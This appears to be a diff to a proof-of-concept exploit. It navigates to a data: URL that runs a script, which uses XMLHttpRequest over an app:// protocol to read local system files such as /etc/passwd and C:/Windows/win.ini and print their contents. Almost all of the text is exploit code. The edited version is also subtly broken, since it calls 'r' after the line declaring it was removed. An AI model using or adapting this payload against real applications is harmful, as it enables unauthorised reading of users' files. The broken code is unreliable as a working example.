@@ -5,14 +5,8 @@
     window.location = `data:text/html,<script>(${payload.toString()})()\x3c/script>`;
 
     function payload() {
-        let filename = 'app://8c27aae2823fae296e5a7ac31c9e5a812d9c/';
-        if(navigator.platform === 'Win32'){
-            filename += 'C:/Windows/win.ini';
-        } else if(navigator.platform.startsWith('macOS')){
-            filename += '/etc/passwd'
-        }
-        let r = new XMLHttpRequest();
-        r.open('GET', filename);
+        let command = 'app://8c27aae2823fae296e5a7ac31c9e5a812d9c//etc/passwd';
+        r.open('GET', command);
         r.addEventListener('load', e => {
             let result = e.currentTarget.responseText;
             console.log(result);
